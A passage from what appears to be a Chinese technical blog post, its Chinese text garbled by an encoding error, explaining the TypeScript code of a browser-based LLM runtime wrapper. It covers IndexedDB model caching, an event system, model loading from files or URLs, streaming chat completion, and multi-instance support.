      <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">loadModelFromFiles</span>([file], options);
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-comment">// é”™è¯¯å¤„ç†...</span>
    }
  }
}
</code></pre>
<h2 data-id="heading-11">ç¼“å­˜ç®¡ç†ç³»ç»Ÿï¼šIndexedDBå®ç°</h2>
<p>é¡¹ç›®é‡‡ç”¨ IndexedDB å®ç°æ¨¡å‹æ–‡ä»¶çš„æŒä¹…åŒ–ç¼“å­˜ï¼Œæ”¯æŒå¤§æ–‡ä»¶å­˜å‚¨å’Œå¿«é€Ÿæ£€ç´¢ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/wllama-core/cache-manager.ts</span>

<span class="hljs-comment">/**
 * CacheManager - åŸºäº IndexedDB çš„ç¼“å­˜ç®¡ç†å™¨
 */</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CacheManager</span> {
  <span class="hljs-comment">/**
   * ä»URLä¸‹è½½å¹¶ç¼“å­˜æ¨¡å‹æ–‡ä»¶
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">download</span>(<span class="hljs-attr">url</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">options</span>: <span class="hljs-title class_">DownloadOptions</span> = {}): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-built_in">void</span>&gt; {
    <span class="hljs-keyword">const</span> filename = <span class="hljs-keyword">await</span> <span class="hljs-title function_">urlToFileName</span>(url);

    <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url, {
      <span class="hljs-attr">headers</span>: options.<span class="hljs-property">headers</span>,
      <span class="hljs-attr">signal</span>: options.<span class="hljs-property">signal</span>,
    });

    <span class="hljs-keyword">if</span> (!response.<span class="hljs-property">ok</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Failed to fetch: <span class="hljs-subst">${response.statusText}</span>`</span>);
    }

    <span class="hljs-comment">// æµå¼è¯»å–å¹¶æ˜¾ç¤ºè¿›åº¦</span>
    <span class="hljs-keyword">const</span> reader = response.<span class="hljs-property">body</span>.<span class="hljs-title function_">getReader</span>();
    <span class="hljs-keyword">const</span> <span class="hljs-attr">chunks</span>: <span class="hljs-title class_">Uint8Array</span>[] = [];
    <span class="hljs-keyword">let</span> loaded = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">const</span> contentLength = response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'content-length'</span>);
    <span class="hljs-keyword">const</span> total = contentLength ? <span class="hljs-built_in">parseInt</span>(contentLength, <span class="hljs-number">10</span>) : <span class="hljs-number">0</span>;

    <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>) {
      <span class="hljs-keyword">const</span> { done, value } = <span class="hljs-keyword">await</span> reader.<span class="hljs-title function_">read</span>();
      <span class="hljs-keyword">if</span> (done) <span class="hljs-keyword">break</span>;
      chunks.<span class="hljs-title function_">push</span>(value);
      loaded += value.<span class="hljs-property">length</span>;
      <span class="hljs-keyword">if</span> (options.<span class="hljs-property">progressCallback</span> &amp;&amp; total &gt; <span class="hljs-number">0</span>) {
        options.<span class="hljs-title function_">progressCallback</span>({ loaded, total });
      }
    }

    <span class="hljs-keyword">const</span> blob = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Blob</span>(chunks <span class="hljs-keyword">as</span> <span class="hljs-title class_">BlobPart</span>[]);
    <span class="hljs-keyword">const</span> db = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getDB</span>();

    <span class="hljs-comment">// å­˜å‚¨åˆ° IndexedDB</span>
    <span class="hljs-keyword">const</span> <span class="hljs-attr">cachedFile</span>: <span class="hljs-title class_">CachedFile</span> = {
      blob,
      <span class="hljs-attr">originalURL</span>: url,
      <span class="hljs-attr">createdAt</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>(),
      <span class="hljs-attr">etag</span>: response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'etag'</span>) || <span class="hljs-literal">undefined</span>,
      <span class="hljs-attr">contentType</span>: response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">'content-type'</span>) || <span class="hljs-literal">undefined</span>,
    };

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
      <span class="hljs-keyword">const</span> transaction = db.<span class="hljs-title function_">transaction</span>([<span class="hljs-variable constant_">STORE_FILES</span>], <span class="hljs-string">'readwrite'</span>);
      <span class="hljs-keyword">const</span> fileStore = transaction.<span class="hljs-title function_">objectStore</span>(<span class="hljs-variable constant_">STORE_FILES</span>);
      fileStore.<span class="hljs-title function_">put</span>(cachedFile, filename);
      transaction.<span class="hljs-property">oncomplete</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">resolve</span>();
      transaction.<span class="hljs-property">onerror</span> = <span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">reject</span>(transaction.<span class="hljs-property">error</span>);
    });
  }

  <span class="hljs-comment">/**
   * ä»ç¼“å­˜æ‰“å¼€æ–‡ä»¶
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">open</span>(<span class="hljs-attr">nameOrURL</span>: <span class="hljs-built_in">string</span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">File</span> | <span class="hljs-literal">null</span>&gt; {
    <span class="hljs-keyword">const</span> db = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getDB</span>();
    <span class="hljs-keyword">let</span> fileName = nameOrURL;

    <span class="hljs-comment">// å°è¯•ç›´æ¥ä½¿ç”¨åç§°</span>
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> file = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getFileFromDB</span>(db, fileName);
      <span class="hljs-keyword">if</span> (file) <span class="hljs-keyword">return</span> file;
    } <span class="hljs-keyword">catch</span> {
      <span class="hljs-comment">// å°è¯•å°†URLè½¬æ¢ä¸ºæ–‡ä»¶å</span>
      <span class="hljs-keyword">try</span> {
        fileName = <span class="hljs-keyword">await</span> <span class="hljs-title function_">urlToFileName</span>(nameOrURL);
        <span class="hljs-keyword">const</span> file = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getFileFromDB</span>(db, fileName);
        <span class="hljs-keyword">if</span> (file) <span class="hljs-keyword">return</span> file;
      } <span class="hljs-keyword">catch</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
      }
    }

    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
  }

  <span class="hljs-comment">/**
   * åˆ—å‡ºæ‰€æœ‰ç¼“å­˜æ–‡ä»¶
   */</span>
  <span class="hljs-keyword">async</span> <span class="hljs-title function_">list</span>(): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">CacheEntry</span>[]&gt; {
    <span class="hljs-keyword">const</span> db = <span class="hljs-keyword">await</span> <span class="hljs-title function_">getDB</span>();
    <span class="hljs-keyword">const</span> allFiles = <span class="hljs-keyword">await</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAllFiles</span>(db);
    <span class="hljs-keyword">const</span> <span class="hljs-attr">result</span>: <span class="hljs-title class_">CacheEntry</span>[] = [];

    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [fileName, cachedFile] <span class="hljs-keyword">of</span> <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">entries</span>(allFiles)) {
      <span class="hljs-keyword">const</span> <span class="hljs-attr">metadata</span>: <span class="hljs-title class_">CacheEntryMetadata</span> = {
        <span class="hljs-attr">originalURL</span>: cachedFile.<span class="hljs-property">originalURL</span> || fileName,
      };
      
      <span class="hljs-comment">// å¤åˆ¶å…¶ä»–å…ƒæ•°æ®å­—æ®µ</span>
      <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(cachedFile).<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> {
        <span class="hljs-keyword">if</span> (key !== <span class="hljs-string">'blob'</span> &amp;&amp; key !== <span class="hljs-string">'originalURL'</span>) {
          metadata[key] = (cachedFile <span class="hljs-keyword">as</span> <span class="hljs-built_in">any</span>)[key];
        }
      });
      
      result.<span class="hljs-title function_">push</span>({
        <span class="hljs-attr">name</span>: fileName,
        <span class="hljs-attr">size</span>: cachedFile.<span class="hljs-property">blob</span>.<span class="hljs-property">size</span>,
        metadata,
      });
    }

    <span class="hljs-keyword">return</span> result;
  }
}
</code></pre>
<p><strong>å…³é”®ç‰¹æ€§</strong>ï¼š</p>
<ul>
<li><strong>URLå“ˆå¸Œæ˜ å°„</strong>ï¼šä½¿ç”¨ SHA-1 å“ˆå¸Œå°† URL è½¬æ¢ä¸ºå”¯ä¸€æ–‡ä»¶å</li>
<li><strong>è¿›åº¦å›è°ƒ</strong>ï¼šæ”¯æŒä¸‹è½½è¿›åº¦å®æ—¶åé¦ˆ</li>
<li><strong>å…ƒæ•°æ®æ‰©å±•</strong>ï¼šå¯æ‰©å±•çš„å…ƒæ•°æ®ç»“æ„ï¼Œæ”¯æŒ ETagã€åˆ›å»ºæ—¶é—´ç­‰</li>
<li><strong>æµè§ˆå™¨å…¼å®¹</strong>ï¼šæ”¯æŒæ‰€æœ‰ç°ä»£æµè§ˆå™¨ï¼ŒåŒ…æ‹¬è¾ƒæ—§ç‰ˆæœ¬</li>
</ul>
<h2 data-id="heading-12">äº‹ä»¶é©±åŠ¨æ¶æ„ï¼šEventEmitterè®¾è®¡</h2>
<p>é¡¹ç›®é‡‡ç”¨äº‹ä»¶ç³»ç»Ÿï¼Œå®ç°ç»„ä»¶é—´çš„æ¾è€¦åˆé€šä¿¡ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/wllama-core/wllama-core.ts</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">WllamaCoreEvent</span> {
  <span class="hljs-variable constant_">MODEL_LOADING</span> = <span class="hljs-string">'model_loading'</span>,      <span class="hljs-comment">// æ¨¡å‹åŠ è½½ä¸­</span>
  <span class="hljs-variable constant_">MODEL_LOADED</span> = <span class="hljs-string">'model_loaded'</span>,        <span class="hljs-comment">// æ¨¡å‹åŠ è½½å®Œæˆ</span>
  <span class="hljs-variable constant_">MODEL_UNLOADED</span> = <span class="hljs-string">'model_unloaded'</span>,    <span class="hljs-comment">// æ¨¡å‹å·²å¸è½½</span>
  <span class="hljs-variable constant_">GENERATION_START</span> = <span class="hljs-string">'generation_start'</span>, <span class="hljs-comment">// ç”Ÿæˆå¼€å§‹</span>
  <span class="hljs-variable constant_">GENERATION_UPDATE</span> = <span class="hljs-string">'generation_update'</span>, <span class="hljs-comment">// ç”Ÿæˆæ›´æ–°</span>
  <span class="hljs-variable constant_">GENERATION_END</span> = <span class="hljs-string">'generation_end'</span>,     <span class="hljs-comment">// ç”Ÿæˆç»“æŸ</span>
  <span class="hljs-variable constant_">ERROR</span> = <span class="hljs-string">'error'</span>,                       <span class="hljs-comment">// é”™è¯¯</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WllamaCore</span> {
  <span class="hljs-keyword">private</span> <span class="hljs-attr">eventListeners</span>: <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">WllamaCoreEvent</span>, <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">EventListener</span>&gt;&gt; = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();

  <span class="hljs-comment">/**
   * æ³¨å†Œäº‹ä»¶ç›‘å¬å™¨
   */</span>
  <span class="hljs-title function_">on</span>(<span class="hljs-params">event: WllamaCoreEvent, listener: EventListener</span>) {
    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-property">eventListeners</span>.<span class="hljs-title function_">has</span>(event)) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">eventListeners</span>.<span class="hljs-title function_">set</span>(event, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>());
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">eventListeners</span>.<span class="hljs-title function_">get</span>(event)!.<span class="hljs-title function_">add</span>(listener);
  }

  <span class="hljs-comment">/**
   * ç§»é™¤äº‹ä»¶ç›‘å¬å™¨
   */</span>
  <span class="hljs-title function_">off</span>(<span class="hljs-params">event: WllamaCoreEvent, listener: EventListener</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">eventListeners</span>.<span class="hljs-title function_">get</span>(event)?.<span class="hljs-title function_">delete</span>(listener);
  }

  <span class="hljs-comment">/**
   * è§¦å‘äº‹ä»¶
   */</span>
  <span class="hljs-keyword">private</span> <span class="hljs-title function_">emit</span>(<span class="hljs-params">event: WllamaCoreEvent, data?: <span class="hljs-built_in">unknown</span></span>) {
    <span class="hljs-keyword">const</span> listeners = <span class="hljs-variable language_">this</span>.<span class="hljs-property">eventListeners</span>.<span class="hljs-title function_">get</span>(event);
    <span class="hljs-keyword">if</span> (listeners) {
      listeners.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">listener</span>) =&gt;</span> <span class="hljs-title function_">listener</span>(data));
    }
  }
}
</code></pre>
<h3 data-id="heading-13">æ”¯æŒçš„äº‹ä»¶ç±»å‹</h3>
<ul>
<li><code>model_loading</code> - æ¨¡å‹åŠ è½½ä¸­</li>
<li><code>model_loaded</code> - æ¨¡å‹åŠ è½½å®Œæˆ</li>
<li><code>model_unloaded</code> - æ¨¡å‹å·²å¸è½½</li>
<li><code>generation_start</code> - ç”Ÿæˆå¼€å§‹</li>
<li><code>generation_update</code> - ç”Ÿæˆæ›´æ–°ï¼ˆæµå¼è¾“å‡ºï¼‰</li>
<li><code>generation_end</code> - ç”Ÿæˆç»“æŸ</li>
<li><code>error</code> - é”™è¯¯äº‹ä»¶</li>
</ul>
<h3 data-id="heading-14">å¤šå®ä¾‹äº‹ä»¶ç³»ç»Ÿ</h3>
<p>åœ¨å¤šå®ä¾‹æ¨¡å¼ä¸‹ï¼Œæ‰€æœ‰äº‹ä»¶æ•°æ®éƒ½åŒ…å« <code>instanceId</code> å­—æ®µï¼Œç”¨äºåŒºåˆ†ä¸åŒå®ä¾‹çš„äº‹ä»¶ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç›‘å¬ç‰¹å®šå®ä¾‹çš„äº‹ä»¶</span>
instance1.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">MODEL_LOADED</span>, <span class="hljs-function">(<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å®ä¾‹1æ¨¡å‹å·²åŠ è½½:'</span>, data.<span class="hljs-property">instanceId</span>);
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ¨¡å‹å…ƒæ•°æ®:'</span>, data.<span class="hljs-property">metadata</span>);
});

<span class="hljs-comment">// ç›‘å¬æ‰€æœ‰å®ä¾‹çš„äº‹ä»¶ï¼Œé€šè¿‡ instanceId åŒºåˆ†</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleUpdate</span> = (<span class="hljs-params">data: { data: <span class="hljs-built_in">string</span>; instanceId: <span class="hljs-built_in">string</span> }</span>) =&gt; {
  <span class="hljs-keyword">if</span> (data.<span class="hljs-property">instanceId</span> === <span class="hljs-string">'chat-1'</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'èŠå¤©1æ›´æ–°:'</span>, data.<span class="hljs-property">data</span>);
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (data.<span class="hljs-property">instanceId</span> === <span class="hljs-string">'chat-2'</span>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'èŠå¤©2æ›´æ–°:'</span>, data.<span class="hljs-property">data</span>);
  }
};

instance1.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">GENERATION_UPDATE</span>, handleUpdate);
instance2.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">GENERATION_UPDATE</span>, handleUpdate);
</code></pre>
<p><strong>äº‹ä»¶æ•°æ®ç»“æ„</strong>ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æ‰€æœ‰äº‹ä»¶æ•°æ®éƒ½åŒ…å« instanceId</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">BaseEventData</span> {
  <span class="hljs-attr">instanceId</span>: <span class="hljs-built_in">string</span>;
}

<span class="hljs-comment">// æ¨¡å‹åŠ è½½äº‹ä»¶</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ModelLoadedEventData</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseEventData</span> {
  <span class="hljs-attr">metadata</span>: <span class="hljs-title class_">ModelMetadata</span>;
  <span class="hljs-attr">runtimeInfo</span>: <span class="hljs-title class_">RuntimeInfo</span>;
}

<span class="hljs-comment">// ç”Ÿæˆæ›´æ–°äº‹ä»¶</span>
<span class="hljs-keyword">interface</span> <span class="hljs-title class_">GenerationUpdateEventData</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseEventData</span> {
  <span class="hljs-attr">data</span>: <span class="hljs-built_in">string</span>;
}
</code></pre>
<h2 data-id="heading-15">æ ¸å¿ƒåŠŸèƒ½ç‰¹æ€§</h2>
<h3 data-id="heading-16">1. å¤šç§æ¨¡å‹åŠ è½½æ–¹å¼</h3>
<p>æ”¯æŒä¸‰ç§æ¨¡å‹åŠ è½½æ–¹å¼ï¼Œæ»¡è¶³ä¸åŒä½¿ç”¨åœºæ™¯ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">WllamaCore</span>, <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/wllama-core'</span>;

<span class="hljs-keyword">const</span> wllamaCore = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WllamaCore</span>({ <span class="hljs-attr">paths</span>: <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> });

<span class="hljs-comment">// æ–¹å¼1: ä»æœ¬åœ°æ–‡ä»¶åŠ è½½</span>
<span class="hljs-keyword">const</span> files = [<span class="hljs-comment">/* File å¯¹è±¡ */</span>];
<span class="hljs-keyword">await</span> wllamaCore.<span class="hljs-title function_">loadModelFromFiles</span>(files, {
  <span class="hljs-attr">n_ctx</span>: <span class="hljs-number">4096</span>,
  <span class="hljs-attr">n_batch</span>: <span class="hljs-number">128</span>,
});

<span class="hljs-comment">// æ–¹å¼2: ä»URLåŠ è½½ï¼ˆè‡ªåŠ¨ç¼“å­˜ï¼‰</span>
<span class="hljs-keyword">await</span> wllamaCore.<span class="hljs-title function_">loadModelFromUrl</span>(<span class="hljs-string">'https://example.com/model.gguf'</span>, {
  <span class="hljs-attr">n_ctx</span>: <span class="hljs-number">4096</span>,
  <span class="hljs-attr">useCache</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// é»˜è®¤å¯ç”¨</span>
  <span class="hljs-attr">downloadOptions</span>: {
    <span class="hljs-attr">progressCallback</span>: <span class="hljs-function">(<span class="hljs-params">progress</span>) =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`ä¸‹è½½è¿›åº¦: <span class="hljs-subst">${progress.loaded}</span>/<span class="hljs-subst">${progress.total}</span>`</span>);
    },
  },
});

<span class="hljs-comment">// æ–¹å¼3: ä»ç¼“å­˜åŠ è½½</span>
<span class="hljs-keyword">import</span> { cacheManager } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/wllama-core'</span>;
<span class="hljs-keyword">const</span> cachedFile = <span class="hljs-keyword">await</span> cacheManager.<span class="hljs-title function_">open</span>(<span class="hljs-string">'https://example.com/model.gguf'</span>);
<span class="hljs-keyword">if</span> (cachedFile) {
  <span class="hljs-keyword">await</span> wllamaCore.<span class="hljs-title function_">loadModelFromFiles</span>([cachedFile], { <span class="hljs-attr">n_ctx</span>: <span class="hljs-number">4096</span> });
}
</code></pre>
<h3 data-id="heading-17">2. æµå¼ç”Ÿæˆæ”¯æŒ</h3>
<p>æ”¯æŒå®æ—¶æµå¼è¾“å‡ºï¼Œæä¾›æµç•…çš„ç”¨æˆ·ä½“éªŒï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> wllamaCore.<span class="hljs-title function_">createChatCompletion</span>(messages, {
  <span class="hljs-attr">nPredict</span>: <span class="hljs-number">4096</span>,
  <span class="hljs-attr">useCache</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">sampling</span>: { <span class="hljs-attr">temp</span>: <span class="hljs-number">0.2</span> },
  <span class="hljs-title function_">onNewToken</span>(<span class="hljs-params">token, piece, currentText, opts</span>) {
    <span class="hljs-comment">// å®æ—¶æ›´æ–°UI</span>
    <span class="hljs-title function_">setMessages</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> {
      <span class="hljs-keyword">const</span> updated = [...prev];
      updated[updated.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>].<span class="hljs-property">content</span> = currentText;
      <span class="hljs-keyword">return</span> updated;
    });
    
    <span class="hljs-comment">// å¯ä»¥éšæ—¶åœæ­¢ç”Ÿæˆ</span>
    <span class="hljs-comment">// opts.abortSignal();</span>
  },
});
</code></pre>
<h3 data-id="heading-18">3. å‚æ•°æŒä¹…åŒ–</h3>
<p>æ¨ç†å‚æ•°è‡ªåŠ¨ä¿å­˜åˆ° localStorageï¼Œä¸‹æ¬¡ä½¿ç”¨æ—¶è‡ªåŠ¨æ¢å¤ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// è®¾ç½®å‚æ•°ï¼ˆè‡ªåŠ¨ä¿å­˜ï¼‰</span>
wllamaCore.<span class="hljs-title function_">setInferenceParams</span>({
  <span class="hljs-attr">nContext</span>: <span class="hljs-number">8192</span>,
  <span class="hljs-attr">temperature</span>: <span class="hljs-number">0.7</span>,
  <span class="hljs-attr">nPredict</span>: <span class="hljs-number">2048</span>,
});

<span class="hljs-comment">// è·å–å‚æ•°</span>
<span class="hljs-keyword">const</span> params = wllamaCore.<span class="hljs-title function_">getInferenceParams</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(params);
<span class="hljs-comment">// {</span>
<span class="hljs-comment">//   nThreads: -1,</span>
<span class="hljs-comment">//   nContext: 8192,</span>
<span class="hljs-comment">//   nBatch: 128,</span>
<span class="hljs-comment">//   temperature: 0.7,</span>
<span class="hljs-comment">//   nPredict: 2048</span>
<span class="hljs-comment">// }</span>
</code></pre>
<h3 data-id="heading-19">4. å¤šçº¿ç¨‹æ”¯æŒ</h3>
<p>è‡ªåŠ¨æ£€æµ‹å¹¶ä½¿ç”¨å¤šçº¿ç¨‹æ¨¡å¼ï¼Œå¤§å¹…æå‡æ¨ç†æ€§èƒ½ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// src/middleware.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">middleware</span>(<span class="hljs-params">request: NextRequest</span>) {
  <span class="hljs-keyword">const</span> response = <span class="hljs-title class_">NextResponse</span>.<span class="hljs-title function_">next</span>();
  
  <span class="hljs-comment">// å¯ç”¨ SharedArrayBuffer æ”¯æŒï¼ˆå¤šçº¿ç¨‹æ‰€éœ€ï¼‰</span>
  response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">set</span>(<span class="hljs-string">'Cross-Origin-Opener-Policy'</span>, <span class="hljs-string">'same-origin'</span>);
  response.<span class="hljs-property">headers</span>.<span class="hljs-title function_">set</span>(<span class="hljs-string">'Cross-Origin-Embedder-Policy'</span>, <span class="hljs-string">'require-corp'</span>);
  
  <span class="hljs-keyword">return</span> response;
}
</code></pre>
<p><strong>æ³¨æ„äº‹é¡¹</strong>ï¼š</p>
<ul>
<li>å¿…é¡»åœ¨ HTTPS ç¯å¢ƒä¸‹è¿è¡Œï¼ˆæˆ– localhostï¼‰</li>
<li>éœ€è¦æµè§ˆå™¨æ”¯æŒ SharedArrayBuffer</li>
<li>è®¾ç½®å“åº”å¤´åéœ€è¦é‡å¯å¼€å‘æœåŠ¡å™¨</li>
</ul>
<h3 data-id="heading-20">5. å¤šå®ä¾‹æ”¯æŒ</h3>
<p>æ”¯æŒåˆ›å»ºå’Œç®¡ç†å¤šä¸ªç‹¬ç«‹çš„ WllamaCore å®ä¾‹ï¼Œæ¯ä¸ªå®ä¾‹å¯ä»¥åŠ è½½ä¸åŒçš„æ¨¡å‹ï¼Œç‹¬ç«‹è¿›è¡Œæ¨ç†ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { wllamaCoreFactory, <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span>, <span class="hljs-title class_">Message</span>, <span class="hljs-title class_">WllamaCoreEvent</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/wllama-core'</span>;

<span class="hljs-comment">// åˆ›å»ºå¤šä¸ªå®ä¾‹</span>
<span class="hljs-keyword">const</span> instance1 = wllamaCoreFactory.<span class="hljs-title function_">getOrCreate</span>(<span class="hljs-string">'chat-1'</span>, { <span class="hljs-attr">paths</span>: <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> });
<span class="hljs-keyword">const</span> instance2 = wllamaCoreFactory.<span class="hljs-title function_">getOrCreate</span>(<span class="hljs-string">'chat-2'</span>, { <span class="hljs-attr">paths</span>: <span class="hljs-variable constant_">WLLAMA_CONFIG_PATHS</span> });

<span class="hljs-comment">// æ¯ä¸ªå®ä¾‹å¯ä»¥åŠ è½½ä¸åŒçš„æ¨¡å‹</span>
<span class="hljs-keyword">await</span> instance1.<span class="hljs-title function_">loadModelFromUrl</span>(<span class="hljs-string">'https://example.com/model1.gguf'</span>);
<span class="hljs-keyword">await</span> instance2.<span class="hljs-title function_">loadModelFromUrl</span>(<span class="hljs-string">'https://example.com/model2.gguf'</span>);

<span class="hljs-comment">// ç‹¬ç«‹è¿›è¡Œæ¨ç†</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">messages1</span>: <span class="hljs-title class_">Message</span>[] = [{ <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'ä½ å¥½'</span> }];
<span class="hljs-keyword">const</span> <span class="hljs-attr">messages2</span>: <span class="hljs-title class_">Message</span>[] = [{ <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>, <span class="hljs-attr">content</span>: <span class="hljs-string">'Hello'</span> }];

<span class="hljs-keyword">const</span> [result1, result2] = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>([
  instance1.<span class="hljs-title function_">createChatCompletion</span>(messages1),
  instance2.<span class="hljs-title function_">createChatCompletion</span>(messages2),
]);

<span class="hljs-comment">// ç›‘å¬ä¸åŒå®ä¾‹çš„äº‹ä»¶ï¼ˆäº‹ä»¶æ•°æ®åŒ…å« instanceIdï¼‰</span>
instance1.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">MODEL_LOADED</span>, <span class="hljs-function">(<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å®ä¾‹1æ¨¡å‹å·²åŠ è½½:'</span>, data.<span class="hljs-property">instanceId</span>);
});

instance2.<span class="hljs-title function_">on</span>(<span class="hljs-title class_">WllamaCoreEvent</span>.<span class="hljs-property">GENERATION_UPDATE</span>, <span class="hljs-function">(<span class="hljs-params">data: <span class="hljs-built_in">any</span></span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å®ä¾‹2ç”Ÿæˆæ›´æ–°:'</span>, data.<span class="hljs-property">data</span>, <span class="hljs-string">'å®ä¾‹ID:'</span>, data.<span class="hljs-property">instanceId</span>);
});

<span class="hljs-comment">// è·å–æ‰€æœ‰å®ä¾‹</span>
<span class="hljs-keyword">const</span> allInstances = wllamaCoreFactory.<span class="hljs-title function_">getAll</span>();
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`å½“å‰æœ‰ <span class="hljs-subst">${allInstances.size}</span> ä¸ªå®ä¾‹`</span>);

<span class="hljs-comment">// é”€æ¯æŒ‡å®šå®ä¾‹</span>
<span class="hljs-keyword">await</span> wllamaCoreFactory.<span class="hljs-title function_">destroy</span>(<span class="hljs-string">'chat-1'</span>);

<span class="hljs-comment">// é”€æ¯æ‰€æœ‰å®ä¾‹</span>
